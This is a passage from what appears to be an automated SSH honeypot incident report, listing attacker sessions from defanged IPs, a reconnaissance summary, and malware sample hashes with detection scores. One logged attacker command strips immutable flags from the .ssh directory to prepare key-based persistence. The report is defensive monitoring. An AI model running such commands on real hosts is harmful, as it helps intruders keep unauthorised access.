- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f8ce8943433

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:35` | `cowrie.session.connect` |
| `2026-07-12 14:53:35` | `cowrie.client.version` |
| `2026-07-12 14:53:35` | `cowrie.client.kex` |
| `2026-07-12 14:53:36` | `cowrie.login.success` |
| `2026-07-12 14:53:38` | `cowrie.session.params` |
| `2026-07-12 14:53:38` | `cowrie.command.input` |
| `2026-07-12 14:53:38` | `cowrie.log.closed` |
| `2026-07-12 14:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a95e29642bd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:41` | `cowrie.session.connect` |
| `2026-07-12 14:53:41` | `cowrie.client.version` |
| `2026-07-12 14:53:41` | `cowrie.client.kex` |
| `2026-07-12 14:53:42` | `cowrie.login.success` |
| `2026-07-12 14:53:42` | `cowrie.session.params` |
| `2026-07-12 14:53:42` | `cowrie.command.input` |
| `2026-07-12 14:53:42` | `cowrie.log.closed` |
| `2026-07-12 14:53:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a589061b895

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:47` | `cowrie.session.connect` |
| `2026-07-12 14:53:47` | `cowrie.client.version` |
| `2026-07-12 14:53:47` | `cowrie.client.kex` |
| `2026-07-12 14:53:48` | `cowrie.login.success` |
| `2026-07-12 14:53:49` | `cowrie.session.params` |
| `2026-07-12 14:53:49` | `cowrie.command.input` |
| `2026-07-12 14:53:49` | `cowrie.log.closed` |
| `2026-07-12 14:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e228bd9f41a3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:53` | `cowrie.session.connect` |
| `2026-07-12 14:53:53` | `cowrie.client.version` |
| `2026-07-12 14:53:53` | `cowrie.client.kex` |
| `2026-07-12 14:53:54` | `cowrie.login.success` |
| `2026-07-12 14:53:55` | `cowrie.session.params` |
| `2026-07-12 14:53:55` | `cowrie.command.input` |
| `2026-07-12 14:53:55` | `cowrie.log.closed` |
| `2026-07-12 14:53:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e48dfd4ef383

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:53 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:53:59` | `cowrie.session.connect` |
| `2026-07-12 14:53:59` | `cowrie.client.version` |
| `2026-07-12 14:53:59` | `cowrie.client.kex` |
| `2026-07-12 14:54:00` | `cowrie.login.success` |
| `2026-07-12 14:54:01` | `cowrie.session.params` |
| `2026-07-12 14:54:01` | `cowrie.command.input` |
| `2026-07-12 14:54:01` | `cowrie.log.closed` |
| `2026-07-12 14:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d94afcef46e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:05` | `cowrie.session.connect` |
| `2026-07-12 14:54:05` | `cowrie.client.version` |
| `2026-07-12 14:54:05` | `cowrie.client.kex` |
| `2026-07-12 14:54:06` | `cowrie.login.success` |
| `2026-07-12 14:54:07` | `cowrie.session.params` |
| `2026-07-12 14:54:07` | `cowrie.command.input` |
| `2026-07-12 14:54:07` | `cowrie.log.closed` |
| `2026-07-12 14:54:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0493a14beb8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:10` | `cowrie.session.connect` |
| `2026-07-12 14:54:10` | `cowrie.client.version` |
| `2026-07-12 14:54:10` | `cowrie.client.kex` |
| `2026-07-12 14:54:11` | `cowrie.login.success` |
| `2026-07-12 14:54:12` | `cowrie.session.params` |
| `2026-07-12 14:54:12` | `cowrie.command.input` |
| `2026-07-12 14:54:12` | `cowrie.log.closed` |
| `2026-07-12 14:54:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42c487fb9d91

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:16` | `cowrie.session.connect` |
| `2026-07-12 14:54:16` | `cowrie.client.version` |
| `2026-07-12 14:54:16` | `cowrie.client.kex` |
| `2026-07-12 14:54:17` | `cowrie.login.success` |
| `2026-07-12 14:54:18` | `cowrie.session.params` |
| `2026-07-12 14:54:18` | `cowrie.command.input` |
| `2026-07-12 14:54:18` | `cowrie.log.closed` |
| `2026-07-12 14:54:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-85dedbd7e0bb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:22` | `cowrie.session.connect` |
| `2026-07-12 14:54:22` | `cowrie.client.version` |
| `2026-07-12 14:54:22` | `cowrie.client.kex` |
| `2026-07-12 14:54:23` | `cowrie.login.success` |
| `2026-07-12 14:54:24` | `cowrie.session.params` |
| `2026-07-12 14:54:24` | `cowrie.command.input` |
| `2026-07-12 14:54:24` | `cowrie.log.closed` |
| `2026-07-12 14:54:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01be566416de

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:28` | `cowrie.session.connect` |
| `2026-07-12 14:54:28` | `cowrie.client.version` |
| `2026-07-12 14:54:28` | `cowrie.client.kex` |
| `2026-07-12 14:54:29` | `cowrie.login.success` |
| `2026-07-12 14:54:29` | `cowrie.session.params` |
| `2026-07-12 14:54:29` | `cowrie.command.input` |
| `2026-07-12 14:54:30` | `cowrie.log.closed` |
| `2026-07-12 14:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66b6b50bca61

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:33` | `cowrie.session.connect` |
| `2026-07-12 14:54:33` | `cowrie.client.version` |
| `2026-07-12 14:54:33` | `cowrie.client.kex` |
| `2026-07-12 14:54:34` | `cowrie.login.success` |
| `2026-07-12 14:54:35` | `cowrie.session.params` |
| `2026-07-12 14:54:35` | `cowrie.command.input` |
| `2026-07-12 14:54:35` | `cowrie.log.closed` |
| `2026-07-12 14:54:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26284738a0fd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:39` | `cowrie.session.connect` |
| `2026-07-12 14:54:39` | `cowrie.client.version` |
| `2026-07-12 14:54:39` | `cowrie.client.kex` |
| `2026-07-12 14:54:40` | `cowrie.login.success` |
| `2026-07-12 14:54:41` | `cowrie.session.params` |
| `2026-07-12 14:54:41` | `cowrie.command.input` |
| `2026-07-12 14:54:41` | `cowrie.log.closed` |
| `2026-07-12 14:54:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6e09c4cd549

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:45` | `cowrie.session.connect` |
| `2026-07-12 14:54:45` | `cowrie.client.version` |
| `2026-07-12 14:54:45` | `cowrie.client.kex` |
| `2026-07-12 14:54:46` | `cowrie.login.success` |
| `2026-07-12 14:54:46` | `cowrie.session.params` |
| `2026-07-12 14:54:46` | `cowrie.command.input` |
| `2026-07-12 14:54:47` | `cowrie.log.closed` |
| `2026-07-12 14:54:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8aabb6aa98f6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:51` | `cowrie.session.connect` |
| `2026-07-12 14:54:51` | `cowrie.client.version` |
| `2026-07-12 14:54:51` | `cowrie.client.kex` |
| `2026-07-12 14:54:51` | `cowrie.login.success` |
| `2026-07-12 14:54:52` | `cowrie.session.params` |
| `2026-07-12 14:54:52` | `cowrie.command.input` |
| `2026-07-12 14:54:52` | `cowrie.log.closed` |
| `2026-07-12 14:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-383d3180d6d5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]123` |
| **First Seen** | 2026-07-12 14:54 |
| **Last Seen** | 2026-07-12 14:54 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:54:56` | `cowrie.session.connect` |
| `2026-07-12 14:54:57` | `cowrie.client.version` |
| `2026-07-12 14:54:57` | `cowrie.client.kex` |
| `2026-07-12 14:54:58` | `cowrie.login.success` |
| `2026-07-12 14:54:59` | `cowrie.session.params` |
| `2026-07-12 14:54:59` | `cowrie.command.input` |
| `2026-07-12 14:54:59` | `cowrie.log.closed` |
| `2026-07-12 14:54:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]123` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]123` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b9570b0f2cb

| Field | Detail |
|---|---|
| **Source IP** | `152.32.171[.]184` |
| **First Seen** | 2026-07-12 14:55 |
| **Last Seen** | 2026-07-12 14:55 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-12 14:55:00` | `cowrie.session.connect` |
| `2026-07-12 14:55:00` | `cowrie.client.version` |
| `2026-07-12 14:55:00` | `cowrie.client.kex` |
| `2026-07-12 14:55:01` | `cowrie.login.success` |
| `2026-07-12 14:55:03` | `cowrie.session.params` |
| `2026-07-12 14:55:03` | `cowrie.command.input` |
| `2026-07-12 14:55:03` | `cowrie.command.failed` |
| `2026-07-12 14:55:03` | `cowrie.log.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.171[.]184` to AbuseIPDB if not already reported
- [ ] Block `152.32.171[.]184` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `179.61.192[.]156` | **28** | 2026-07-12 12:55 | 2026-07-12 14:50 | 29m | 0 | `T1592` | 🟠 MEDIUM |
| `160.153.187[.]122` | **11** | 2026-07-12 12:55 | 2026-07-12 14:54 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **5** | 2026-07-12 12:55 | 2026-07-12 14:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]176` | **3** | 2026-07-12 14:02 | 2026-07-12 14:54 | 0m | 2 | `T1110.001 · T1592` | 🟢 LOW |
| `3.131.220[.]121` | **2** | 2026-07-12 13:11 | 2026-07-12 13:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.79.128[.]205` | **2** | 2026-07-12 13:08 | 2026-07-12 13:08 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.47[.]123` | **2** | 2026-07-12 14:43 | 2026-07-12 14:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `101.126.30[.]240` | 1 | 2026-07-12 13:38 | 2026-07-12 13:40 | 120s | 0 | `T1592` | 🟢 LOW |
| `104.143.10[.]174` | 1 | 2026-07-12 13:23 | 2026-07-12 13:24 | 12s | 0 | `T1592` | 🟢 LOW |
| `107.150.146[.]69` | 1 | 2026-07-12 14:31 | 2026-07-12 14:32 | 36s | 0 | `T1592` | 🟢 LOW |
| `112.29.109[.]174` | 1 | 2026-07-12 14:48 | 2026-07-12 14:48 | 6s | 0 | `T1592` | 🟢 LOW |
| `116.48.143[.]166` | 1 | 2026-07-12 14:05 | 2026-07-12 14:05 | 5s | 0 | `T1592` | 🟢 LOW |
| `120.193.9[.]169` | 1 | 2026-07-12 13:53 | 2026-07-12 13:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `157.122.156[.]26` | 1 | 2026-07-12 14:09 | 2026-07-12 14:10 | 14s | 0 | `T1592` | 🟢 LOW |
| `195.158.26[.]59` | 1 | 2026-07-12 13:44 | 2026-07-12 13:44 | 2s | 0 | `T1592` | 🟢 LOW |
| `2.58.172[.]185` | 1 | 2026-07-12 13:10 | 2026-07-12 13:10 | 0s | 0 | `T1592` | 🟢 LOW |
| `218.21.243[.]58` | 1 | 2026-07-12 12:59 | 2026-07-12 12:59 | 18s | 0 | `T1592` | 🟢 LOW |
| `219.151.187[.]107` | 1 | 2026-07-12 13:50 | 2026-07-12 13:52 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.33.109[.]8` | 1 | 2026-07-12 13:33 | 2026-07-12 13:33 | 0s | 0 | `T1592` | 🟢 LOW |
| `45.79.115[.]59` | 1 | 2026-07-12 13:33 | 2026-07-12 13:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `69.164.217[.]245` | 1 | 2026-07-12 14:33 | 2026-07-12 14:33 | 1s | 0 | `T1592` | 🟢 LOW |
| `78.66.44[.]246` | 1 | 2026-07-12 14:33 | 2026-07-12 14:35 | 120s | 0 | `T1592` | 🟢 LOW |
| `80.94.95[.]43` | 1 | 2026-07-12 13:36 | 2026-07-12 13:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `83.239.108[.]218` | 1 | 2026-07-12 12:56 | 2026-07-12 12:58 | 120s | 0 | `T1592` | 🟢 LOW |
| `94.154.43[.]239` | 1 | 2026-07-12 13:46 | 2026-07-12 13:46 | 1s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 57/100 | 🟡 MEDIUM | **18/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 52/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 67/100 | 🟡 MEDIUM | **19/74** 🔴 |
